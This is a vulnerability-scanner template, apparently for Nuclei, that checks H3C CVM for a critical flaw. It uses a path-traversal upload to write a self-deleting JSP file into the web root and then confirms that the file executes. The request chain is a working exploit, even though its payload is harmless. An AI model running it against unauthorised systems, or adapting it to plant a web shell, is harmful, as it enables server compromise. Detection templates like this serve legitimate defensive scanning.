id: h3c-cvm-upload-file-upload

info:
  name: H3C CVM File Upload
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Exploits a file upload vulnerability in H3C CVM by uploading a temporary JSP file and checking its execution.
  reference:
    - https://planet.vulbox.com/detail/MTE4MDM=

variables:
  random_string_a: "{{rand_text_alphanumeric(20)}}"
  random_string_c: "{{rand_text_alphanumeric(10)}}"

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{random_string_c}}.jsp"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Content-range: bytes 0-10/20
      Referer: "{{BaseURL}}/cas/login"
    body: "<%out.println(\"{{random_string_a}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "success"
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: header
        words:
          - "H3C-CVM"

  - id: verify-file
    method: GET
    path:
      - "{{BaseURL}}/cas/js/lib/buttons/{{random_string_c}}.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{random_string_a}}"
